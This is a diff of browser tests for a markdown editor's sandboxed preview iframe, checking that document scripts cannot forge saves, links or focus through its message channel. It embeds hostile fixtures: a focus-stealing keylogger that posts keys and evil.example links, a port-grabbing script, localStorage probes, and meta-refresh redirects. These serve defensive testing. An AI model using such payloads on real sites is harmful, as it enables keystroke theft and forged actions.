+    expect(PREVIEW_BRIDGE).toContain('window.__orzPreview={report:report,post:post,navigated:navigated}'); // post: a window message, never the port
   });
 
-  it('[E.14] focus a document script takes from the editor goes back at once; the shell asks the bridge whether the reader\'s pointerdown followed (Chrome may focus the frame first) and, when not, pauses the document\'s scripts in a new preview frame (a CSP that runs only the frame\'s nonce-stamped scripts) with a quiet note and an error (render); focus the reader\'s pointer (in the frame, or a press on the preview pane in the page), a Tab in the page or the shell\'s own focus() brought is left alone; a forged focus report or answer changes nothing', async () => {
+  it('[E.14] focus entering the preview frame — a document script\'s focus(), or the reader\'s click — moves nothing: the shell does not take it back, replaces no frame, shows no note and emits no error, and a Tab, a window blur and focus round trip leave the preview as it was', async () => {
     const m = mount();
-    let shellPort: { onmessage: ((e: { data: unknown }) => void) | null; sent: Array<Record<string, unknown>> } | null = null;
-    (m.win as unknown as Record<string, unknown>).MessageChannel = class {
-      port1 = { onmessage: null, sent: [] as Array<Record<string, unknown>>, postMessage(x: Record<string, unknown>) { this.sent.push(x); }, close() {} };
-      port2 = {};
-      constructor() { shellPort = this.port1; }
-    };
-    const frameEl = () => m.root.querySelector('iframe')!;
-    const ready = (channel: string) => { const f = frameOf(m); f.say({ type: 'orz-preview-ready', channel }); return f; };
-    const f = ready('tok');
-    const bridge = (data: unknown) => shellPort!.onmessage!({ data });
-    const lastPing = () => shellPort!.sent.filter((x) => x.type === 'orz-preview-ping').at(-1)?.id as number | undefined;
     const errors: string[] = [];
-    m.shell.on('error', (e) => errors.push(`${e.source}: ${e.message}`));
-    const paused = () => frameEl().srcdoc.includes('Content-Security-Policy');
-    const first = frameEl();
+    m.shell.on('error', (e) => errors.push(e.message));
+    const f = authFrameOf(m);
+    const first = m.root.querySelector('iframe')!;
     m.ta().focus();
     f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: true }); // the reader clicked into the preview
+    m.win.dispatchEvent(new m.win.Event('blur') as unknown as Event);
+    m.win.dispatchEvent(new m.win.Event('focus') as unknown as Event);
     key(m, m.ta(), 'Tab');
-    bridge({ type: 'orz-preview-focus', reader: false }); // Tab from the page
-    f.say({ type: 'orz-preview-focus', reader: false }); // forged on the window: not the bridge's
-    m.shell.setMode('preview');
-    m.shell.focus();
-    bridge({ type: 'orz-preview-focus', reader: false }); // the shell's own focus()
-    expect([errors, m.root.activeElement === frameEl(), paused(), lastPing()]).toEqual([[], true, false, undefined]);
-    m.ta().focus();
-    await tick(1100);
-    // a press on the iframe element in the page (Chrome sends the click there while the frame cannot be hit yet)
-    const press = (trusted: boolean) => {
-      const ev = new m.win.PointerEvent('pointerdown', { bubbles: true, composed: true }) as unknown as Event;
-      Object.defineProperty(ev, 'isTrusted', { value: trusted });
-      frameEl().dispatchEvent(ev);
-    };
-    press(false); // a script's event in the page: no explanation
-    f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    expect([m.root.activeElement === m.ta(), typeof lastPing()]).toEqual([true, 'number']);
-    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: true }); // (settled: the reader after all)
-    m.ta().focus();
-    await tick(1100);
-    const pings = shellPort!.sent.length;
-    press(true);
-    f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    expect([m.root.activeElement === frameEl(), shellPort!.sent.length, paused()]).toEqual([true, pings, false]);
-    m.shell.setMode('split');
-    m.ta().focus();
-    await tick(1100); // the Tab and the grant are no longer fresh
-    // focus without the reader's pointer first: back at once, and the bridge is asked
-    f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    expect([m.root.activeElement === m.ta(), paused(), typeof lastPing()]).toEqual([true, false, 'number']);
-    // the bridge answers that the reader's pointerdown followed (Chrome focused the frame first): the reader gets it back
-    f.say({ type: 'orz-preview-pong', id: lastPing(), pointer: false }); // forged on the window: ignored
-    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: true });
-    expect([m.root.activeElement === frameEl(), paused()]).toEqual([true, false]);
-    // so does a late report of the reader's pointer
-    m.ta().focus();
-    await tick(1100);
-    f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    bridge({ type: 'orz-preview-focus', reader: true, late: true });
-    expect([m.root.activeElement === frameEl(), paused()]).toEqual([true, false]);
-    await tick(1100);
-    expect([errors, paused(), frameEl()]).toEqual([[], false, first]); // the question was settled: no timeout, the same frame
-    // a script takes it: the bridge says no pointerdown — the document's frame is replaced by a paused one, and after 0.5 s the note and the error
-    m.ta().focus();
-    await tick(1100);
-    f.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    bridge({ type: 'orz-preview-pong', id: lastPing(), pointer: false });
-    expect(paused()).toBe(false); // under load the click's pointerdown may still be on its way: 1.2 s
-    await tick(1250);
-    expect([m.root.activeElement === m.ta(), paused(), frameEl() !== first, first.isConnected]).toEqual([true, true, true, false]);
-    expect(frameEl().srcdoc).toMatch(/<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-[0-9a-z]{8,}' 'strict-dynamic'">/);
-    expect(frameEl().getAttribute('sandbox')).toBe('allow-scripts');
-    await tick(560);
-    expect(errors).toEqual(['render: The document\'s scripts took the keyboard focus from the editor: they are paused in the preview.']);
-    expect(m.root.querySelector('[data-orz-paused]')!.textContent).toContain('paused in this preview');
-    // again, from the new frame: focus back again, no second note or error
-    const f2 = ready('tok2');
-    f2.iframe.focus();
-    bridge({ type: 'orz-preview-focus', reader: false });
-    expect([m.root.activeElement === m.ta(), errors.length, m.root.querySelectorAll('[data-orz-paused]').length]).toEqual([true, 1, 1]);
+    await tick(1700);
+    expect([m.root.activeElement === f.iframe, m.root.querySelector('iframe') === first, first.srcdoc.includes('Content-Security-Policy'), m.root.querySelector('[data-orz-paused]'), errors, f.port.closed]).toEqual([true, true, false, null, [], false]);
+    expect(f.sent.filter((x) => x.type === 'orz-preview-ping')).toEqual([]);
     m.shell.destroy();
-    // taken again before the question is settled: theft at once (a reader's click does not do that)
-    const r2 = mount();
-    let rPort: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
-    (r2.win as unknown as Record<string, unknown>).MessageChannel = class { port1 = { onmessage: null, postMessage() {}, close() {} }; port2 = {}; constructor() { rPort = this.port1; } };
-    const h = frameOf(r2);
-    h.say({ type: 'orz-preview-ready', channel: 'tok' });
-    r2.ta().focus();
-    h.iframe.focus();
-    rPort!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
-    expect(r2.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy')).toBe(false);
-    h.iframe.focus();
-    rPort!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
-    expect([r2.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy'), r2.root.activeElement === r2.ta()]).toEqual([true, true]);
-    r2.shell.destroy();
-    // no answer from the bridge within 1.5 s: theft
-    const n = mount();
-    let port2: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
-    (n.win as unknown as Record<string, unknown>).MessageChannel = class { port1 = { onmessage: null, postMessage() {}, close() {} }; port2 = {}; constructor() { port2 = this.port1; } };
-    const g = frameOf(n);
-    g.say({ type: 'orz-preview-ready', channel: 'tok' });
-    n.ta().focus();
-    g.iframe.focus();
-    port2!.onmessage!({ data: { type: 'orz-preview-focus', reader: false } });
-    const nPaused = () => n.root.querySelector('iframe')!.srcdoc.includes('Content-Security-Policy');
-    await tick(1000);
-    expect(nPaused()).toBe(false);
-    await tick(600);
-    expect(nPaused()).toBe(true);
-    n.shell.destroy();
   });
 
-  it('[E.14] a wheel on the editor counts as the reader touching it although the editor has no focus: the frame\'s "active" and scroll claims within 300 ms do not move it', async () => {
+  it('[E.14] a wheel on the editor counts as the reader touching it although the editor has no focus: the frame\'s "active" and scroll reports within 300 ms do not move it', async () => {
     const engine = textareaAdapter();
     const scrollTo = vi.spyOn(engine, 'scrollTo');
     const m = mount({ adapter: engine });
-    const f = frameOf(m);
-    f.say({ type: 'orz-preview-ready' });
+    const f = authFrameOf(m);
     m.ta().blur();
     await tick(350);
     m.ta().dispatchEvent(new m.win.WheelEvent('wheel', { bubbles: true, deltaY: 40 }) as unknown as Event);
-    f.say({ type: 'orz-preview-active' });
-    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    f.bridge({ type: 'orz-preview-active' });
+    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
     await tick(100);
-    f.say({ type: 'orz-preview-active' });
-    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    f.bridge({ type: 'orz-preview-active' });
+    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
     expect(scrollTo).not.toHaveBeenCalled();
     await tick(300); // the wheel is 400 ms old: the preview may lead again
-    f.say({ type: 'orz-preview-active' });
-    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    f.bridge({ type: 'orz-preview-active' });
+    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
     expect(scrollTo).toHaveBeenCalled();
     m.shell.destroy();
   });
@@ -2067,12 +2085,11 @@ describe('the preview channel and the frame\'s claims (round 2: F1, B#10)', () =
     const opened: string[] = [];
     const m = mount();
     (m.win as unknown as { open: unknown }).open = (u: string) => { opened.push(u); return null; };
-    const f = frameOf(m);
-    f.say({ type: 'orz-preview-ready' });
-    f.iframe.focus();
-    activation(m, true);
-    f.say({ type: 'orz-preview-link', href: 'https://example.org/page' });
-    f.say({ type: 'orz-preview-link', href: 'javascript:alert(1)' });
+    const f = authFrameOf(m);
+    f.say({ type: 'orz-preview-link', href: 'https://evil.example/forged' }); // on the window: nothing, not even a chip
+    expect(m.root.querySelector('.orz-editor__link-chip')).toBeNull();
+    f.bridge({ type: 'orz-preview-link', href: 'https://example.org/page' });
+    f.bridge({ type: 'orz-preview-link', href: 'javascript:alert(1)' });
     expect(opened).toEqual([]);
     const chip = m.root.querySelector('.orz-editor__link-chip')!;
     expect(chip.textContent).toContain('Open example.org?');
@@ -2199,12 +2216,21 @@ const chrome = browser ? describe : describe.skip;
 chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, () => {
   const servers: http.Server[] = [];
   let A = '';
+  /**
+   * A document script that asks for the preview's port the way a replaced document would (a ready with a
+   * channel, and a guessed secret) and, should it get one, sends a save, a view key, a link and a scroll
+   * through it; `window.__got` records '[port]' when it got one, and what it typed.
+   */
+  const GRAB = "window.__atk=1;window.__got='';addEventListener('message',function(e){var d=e.data;if(d&&d.type==='orz-preview-port'&&e.ports&&e.ports[0]){window.__got+='[port]';var P=e.ports[0];P.postMessage({type:'orz-preview-key',key:'s'});P.postMessage({type:'orz-preview-key',key:'\\\\'});P.postMessage({type:'orz-preview-link',href:'https://evil.example/port'});P.postMessage({type:'orz-preview-scrolled',top:0,max:100000})}},true);parent.postMessage({type:'orz-preview-ready',channel:'g1'},'*');parent.postMessage({type:'orz-preview-ready',channel:'g2',secret:'guess'},'*')";
+  /** Another origin: the pages a document's meta refresh navigates its preview to (option B, finding (b) of round 3). */
+  let EVIL = '';
   let editorJs = '';
   const cm = readFileSync(CODEMIRROR6_PATH, 'utf8');
   const TEXT_A = `﻿{{nyml\r\nkind: document\r\ntitle: A\r\nuid: ${UID_A}\r\n}}\r\n\r\n# Shell A\r\n\r\nParagraph <img src="x" onerror="var r={};try{parent.document.title='pwned'}catch(e){r.doc=e.name}try{r.ls=String(parent.localStorage.length)}catch(e){r.ls=e.name}try{r.mine=String(localStorage.length)}catch(e){r.mine=e.name}parent.postMessage({probe:r},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'},'*')">\r\n`;
   const TEXT_B = `{{nyml\nkind: document\nuid: ${UID_B}\n}}\n\n# Shell B\n\n${Array.from({ length: 80 }, (_, i) => `Line ${i} of B.\n`).join('\n')}`;
   const APP = `
     window.__saved = { a: [], b: [], c: [] };
+    window.__links = [];
     window.__probes = [];
     window.addEventListener('message', function (e) { if (e.data && e.data.probe) window.__probes.push(e.data.probe); });
     // window listeners added by the editor and CodeMirror (not by the test driver's injected script)
@@ -2234,6 +2260,7 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
         adapter: E.codemirror6Adapter({ url: url }),
         hooks: { save: function (t) { window.__saved[id].push(t); return Promise.resolve(); } },
         preview: Object.assign({ assets: false, debounceMs: 50 }, o.preview || {}),
+        onLink: o.links ? function (h) { window.__links.push(h); } : undefined,
       });
       window['shell_' + id] = s;
       window['errors_' + id] = [];
@@ -2262,6 +2289,10 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
     await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
     servers.push(server);
     A = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
+    const evil = http.createServer((_req, res) => { res.setHeader('content-type', 'text/html; charset=utf-8'); res.end(`<!doctype html><title>evil</title><script>${GRAB}</script>`); });
+    await new Promise<void>((r) => evil.listen(0, '127.0.0.1', r));
+    servers.push(evil);
+    EVIL = `http://127.0.0.1:${(evil.address() as AddressInfo).port}/evil`;
   }, 60_000);
 
   afterAll(async () => {
@@ -2710,43 +2741,125 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
     await p.close();
   });
 
-  // ── round 2 of closed loop 2 ──
-  const STEAL = "var i=document.createElement('input');document.body.appendChild(i);document.addEventListener('keydown',function(e){parent.postMessage({stolen:e.key},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'+e.key},'*')},true);setInterval(function(){if(document.activeElement!==i)i.focus()},50)";
+  // ── option B (2026-10-06): the frame secret; focus a document script takes is an accepted limit ──
+  const STEAL = "var i=document.createElement('input');document.body.appendChild(i);document.addEventListener('keydown',function(e){parent.postMessage({stolen:e.key},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-key',key:'\\\\'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'+e.key},'*')},true);setInterval(function(){if(document.activeElement!==i)i.focus()},50)";
   const TEXT_STEAL = `# Doc\n\nHello <img src="x" onerror="${STEAL}">\n`;
+  /** An attribute value (an `onerror` handler, a `srcdoc`) holding script text. */
+  const attr = (js: string) => js.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
 
-  it('[E.13] [E.14] a document script that takes the keyboard focus every 50 ms (and forges a save and a link per stolen key) gets nothing: every key the reader types reaches the editor in order, nothing is saved, no window opens (window.open stubbed, and real), focus stays in the editor, and its scripts are paused in the preview', async () => {
+  it('[E.13] [E.14] a document script that takes the keyboard focus every 50 ms (and forges a save, a view key and a link on the window per stolen key) may get the reader\'s keys — the accepted limit — but nothing else: no save, no view change, no link or window (window.open stubbed, and real), no pause, note or error; a reader\'s click into the preview is just that, and Cmd/Ctrl+S there saves', async () => {
     for (const stub of [true, false]) {
       const p = await open();
       await p.evaluate(`window.__stolen = []; window.__opened = []; ${stub ? 'window.open = function (u) { window.__opened.push(u); return null; };' : ''}
         window.addEventListener('message', function (e) { if (e.data && e.data.stolen) window.__stolen.push(e.data.stolen); })`);
-      expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_STEAL)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
+      expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_STEAL)}, ${JSON.stringify(`${A}/cm6.js`)}, { links: true })`)).toEqual({ engine: 'codemirror6', error: null });
       await p.waitForTimeout(1000);
       await p.locator('#a .cm-content').click();
       await p.keyboard.press('ControlOrMeta+End');
       await p.waitForTimeout(200);
       await p.keyboard.type('hello world', { delay: 60 });
-      await p.waitForTimeout(400);
+      await p.waitForTimeout(500);
       const where = stub ? 'window.open stubbed' : 'real window.open';
-      expect(await p.evaluate('shell_a.getText()'), where).toBe(`${TEXT_STEAL}hello world`);
-      expect(await p.evaluate('[window.__stolen.join(""), window.__saved.a.length, window.__opened.length]'), where).toEqual(['', 0, 0]);
+      const [text, stolen, saved, opened, links, mode] = await p.evaluate('[shell_a.getText(), window.__stolen.join(""), window.__saved.a.length, window.__opened.length, window.__links.length, shell_a.getMode()]') as [string, string, number, number, number, string];
+      // keys may go to the preview (the accepted limit) — what reached the editor is in order, and every key went one way or the other
+      expect(text.startsWith(TEXT_STEAL), where).toBe(true);
+      expect(text.length - TEXT_STEAL.length + stolen.replace(/Control|Meta|\\/g, '').length, where).toBeGreaterThanOrEqual('hello world'.length - 1);
+      expect([saved, opened, links, mode], where).toEqual([0, 0, 0, 'split']);
       expect(p.context().pages(), where).toHaveLength(1);
-      expect(await p.evaluate('shell_a.root.activeElement && shell_a.root.activeElement.className'), where).toContain('cm-content');
-      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a.filter(function (e) { return /took the keyboard/.test(e); }).length]'), where).toEqual([true, 1]);
+      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a, shell_a.root.querySelector("iframe").srcdoc.indexOf("Content-Security-Policy")]'), where).toEqual([false, [], -1]);
       await p.close();
     }
-    // preview-only: after a real click into the (unpaused) preview, Cmd/Ctrl+S there saves
+    // preview-only: after a real click into the preview, Cmd/Ctrl+S there saves (the reader's own key through the port)
     const q = await open();
     await q.evaluate(`mountOpts('a', '# Preview only\\n\\nbody\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
-    await q.evaluate(`shell_a.setMode("preview"); window.__focusLog = [];
-      shell_a.preview.on('orz-preview-focus', function (m) { window.__focusLog.push('focus ' + m.reader + (m.late ? ' late' : '') + ' @' + Math.round(performance.now())); });
-      window.addEventListener('blur', function () { window.__focusLog.push('blur @' + Math.round(performance.now())); });`);
+    await q.evaluate('shell_a.setMode("preview")');
     await frameOf(q, 'body');
     await q.locator('#a iframe').click({ position: { x: 300, y: 30 } });
     await q.keyboard.press('ControlOrMeta+s');
     await q.waitForFunction('window.__saved.a.length === 1');
-    const state = await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), errors_a, shell_a.root.activeElement && shell_a.root.activeElement.className, window.__focusLog]') as [boolean, string[], string, string[]];
-    expect([state[0], state[1]], JSON.stringify(state)).toEqual([true, []]);
+    expect(await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), errors_a]')).toEqual([true, []]);
     await q.close();
+  }, 60_000);
+
+  it('[E.13] [E.14] [E.5] the round-3 vectors get no port and so act on nothing: forged readies (none, a channel, a wrong secret) with forged keys and links; a nested <iframe srcdoc> that steals the focus and posts to the top; document.open() then a ready; a meta refresh to an http page of another origin and to a data: URL, each asking for the port — no save, no view change, no Escape action, no link, no window, no editor scroll; the secret is not in the frame\'s DOM, and after the forgeries the real port still carries renders and the reader\'s own Cmd/Ctrl+S', async () => {
+    const LONG = Array.from({ length: 150 }, (_, i) => `Line ${i}.\n`).join('\n');
+    const vectors: Record<string, string> = {
+      'forged readies': `<img src="x" onerror="${attr(`${GRAB};setInterval(function(){var T=parent;T.postMessage({type:'orz-preview-ready'},'*');T.postMessage({type:'orz-preview-ready',channel:'c1'},'*');T.postMessage({type:'orz-preview-ready',channel:'c2',secret:'guess'},'*');T.postMessage({type:'orz-preview-key',key:'s'},'*');T.postMessage({type:'orz-preview-key',key:'\\\\'},'*');T.postMessage({type:'orz-preview-key',key:'Escape'},'*');T.postMessage({type:'orz-preview-scrolled',top:0,max:100000},'*');T.postMessage({type:'orz-preview-link',href:'https://evil.example/w'},'*')},100)`)}">`,
+      'nested frame': `<iframe srcdoc="${attr(`<script>${GRAB};var i=document.createElement('input');document.documentElement.appendChild(i);setInterval(function(){i.focus();top.postMessage({type:'orz-preview-ready',channel:'n'},'*');top.postMessage({type:'orz-preview-key',key:'s'},'*');top.postMessage({type:'orz-preview-key',key:'\\\\'},'*');parent.parent.postMessage({type:'orz-preview-link',href:'https://evil.example/n'},'*')},60)</` + 'script>')}"></iframe>`,
+      'document.open': `<img src="x" onerror="${attr(`setTimeout(function(){document.open();document.write('<body><p>replaced</p></body>');document.close();${GRAB}},300)`)}">`,
+      'meta refresh http': `<meta http-equiv="refresh" content="1;url=${EVIL}">`,
+      'meta refresh data': `<meta http-equiv="refresh" content="1;url=data:text/html;base64,${Buffer.from(`<!doctype html><script>${GRAB}</` + 'script>').toString('base64')}">`,
+    };
+    for (const [name, body] of Object.entries(vectors)) {
+      const p = await open();
+      await p.evaluate('window.__opened = []; window.open = function (u) { window.__opened.push(u); return null; }');
+      const text = `# Vector\n\n${body}\n\n${LONG}`;
+      await p.evaluate(`mountOpts('a', ${JSON.stringify(text)}, ${JSON.stringify(`${A}/cm6.js`)}, { links: true })`);
+      if (name === 'forged readies') {
+        const f = await frameOf(p, 'Line 149.');
+        const secret = String(await p.evaluate('/data-orz-preview-secret="([^"]+)"/.exec(shell_a.root.querySelector("iframe").srcdoc)[1]'));
+        expect(secret.length, name).toBeGreaterThan(20);
+        expect(await f.evaluate(`[document.querySelectorAll("[data-orz-preview-secret]").length, document.documentElement.outerHTML.indexOf(${JSON.stringify(secret)})]`), name).toEqual([0, -1]);
+      }
+      await p.locator('#a .cm-content').click();
+      await p.keyboard.press('ControlOrMeta+End');
+      await p.keyboard.type('typed', { delay: 40 });
+      await p.waitForTimeout(2600); // the refreshes (1 s) have navigated and asked for the port
+      const grabbed: string[] = [];
+      for (const f of p.frames()) if (f !== p.mainFrame()) grabbed.push(String(await f.evaluate('window.__got || ""').catch(() => '')));
+      const state = await p.evaluate(`[window.__saved.a.length, shell_a.getMode(), window.__links.length, window.__opened.length, shell_a.root.activeElement && shell_a.root.activeElement.className, errors_a.length]`) as [number, string, number, number, string, number];
+      expect(grabbed.join(''), `${name}: a document got the port`).not.toContain('[port]');
+      expect(state.slice(0, 4), name).toEqual([0, 'split', 0, 0]);
+      expect(p.context().pages(), name).toHaveLength(1);
+      if (name !== 'nested frame') {
+        // the editor keeps the focus (no forged Escape moved it to the toolbar) and its scroll at the end
+        expect(state[4], name).toContain('cm-content');
+        expect(await p.locator('#a .cm-scroller').evaluate((el) => (el as HTMLElement).scrollTop), name).toBeGreaterThan(1000);
+        expect(await p.evaluate('shell_a.getText().endsWith("typed")'), name).toBe(true);
+      }
+      if (name === 'forged readies') {
+        // the real port stays open: an edit renders, and the reader's own Cmd/Ctrl+S in the frame saves once
+        await p.keyboard.type(' more');
+        await frameOf(p, 'typed more');
+        await p.locator('#a iframe').click({ position: { x: 300, y: 20 } });
+        await p.keyboard.press('ControlOrMeta+s');
+        await p.waitForFunction('window.__saved.a.length === 1');
+        await p.waitForTimeout(400);
+        expect(await p.evaluate('[window.__saved.a.length, shell_a.getMode(), window.__links.length]')).toEqual([1, 'split', 0]);
+      }
+      await p.close();
+    }
+  }, 120_000);
+
+  it('[E.13] [E.14] a tab switch round trip with the focus in the preview leaves it working: Chrome gives the frame the focus back, which is the reader\'s, so nothing is paused or noted and no error; edits still render and Cmd/Ctrl+S in the frame saves — also in the preview-only view', async () => {
+    for (const view of ['split', 'preview'] as const) {
+      const ctx = await browser!.newContext({ viewport: { width: 1200, height: 1400 } });
+      const p = await ctx.newPage();
+      await p.goto(`${A}/`);
+      await p.waitForFunction('typeof window.mount === "function"');
+      await p.evaluate(`mountOpts('a', '# Tabs\\n\\n' + Array.from({ length: 40 }, function (_, i) { return 'Para ' + i + ' lorem ipsum.\\n'; }).join('\\n'), ${JSON.stringify(`${A}/cm6.js`)})`);
+      if (view === 'preview') await p.evaluate('shell_a.setMode("preview")');
+      await frameOf(p, 'Para 39');
+      await p.locator('#a iframe').click({ position: { x: 200, y: 60 } });
+      await p.mouse.wheel(0, 300);
+      await p.waitForTimeout(400);
+      for (let i = 0; i < 2; i++) {
+        const other = await ctx.newPage();
+        await other.goto(`${A}/`);
+        await other.bringToFront();
+        await other.waitForTimeout(600);
+        await p.bringToFront();
+        await p.waitForTimeout(1500);
+        await other.close();
+      }
+      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a, shell_a.root.querySelector("iframe").srcdoc.indexOf("Content-Security-Policy")]'), view).toEqual([false, [], -1]);
+      await p.locator('#a iframe').click({ position: { x: 200, y: 60 } });
+      await p.keyboard.press('ControlOrMeta+s');
+      await p.waitForFunction('window.__saved.a.length === 1');
+      await p.evaluate('shell_a.setMode("split"); shell_a.setText(shell_a.getText() + "\\nAfter the tabs.\\n")');
+      await frameOf(p, 'After the tabs.');
+      await ctx.close();
+    }
   }, 60_000);
 
   it('[E.13] [E.14] a link the reader clicks in the preview is offered in a chip ("Open <host>?") and opens in a new tab only from the reader\'s click on Open', async () => {
@@ -2811,6 +2924,14 @@ chrome('real Chrome (playwright-core, channel chrome)', { timeout: 120_000 }, ()
     await expect.poll(() => p.evaluate('window.__heard.slice(-1)[0]')).toBe(2);
     expect(await p.evaluate('shell_a.preview.post({ type: "x-deck-go", delta: 1 })')).toBe(true);
     await expect.poll(() => f.evaluate('window.__msgs.join(",")')).toBe('x-deck-go');
+    // __orzPreview.navigated(line) reads a line back through the port — only after the reader's own input in the frame
+    await p.evaluate('window.__lines = []; var sc = shell_a.adapter.scrollTo.bind(shell_a.adapter); shell_a.adapter.scrollTo = function (t) { if (t && typeof t.line === "number") window.__lines.push(t.line); return sc(t); }');
+    await f.evaluate('window.__orzPreview.navigated(3)'); // a script, no input of the reader's: nothing
+    await p.waitForTimeout(300);
+    expect(await p.evaluate('window.__lines')).toEqual([]);
+    await p.locator('#a iframe').click({ position: { x: 200, y: 20 } });
+    await f.evaluate('window.__orzPreview.navigated(4)');
+    await expect.poll(() => p.evaluate('window.__lines.slice(-1)[0]')).toBe(4);
     await p.close();
   });
 
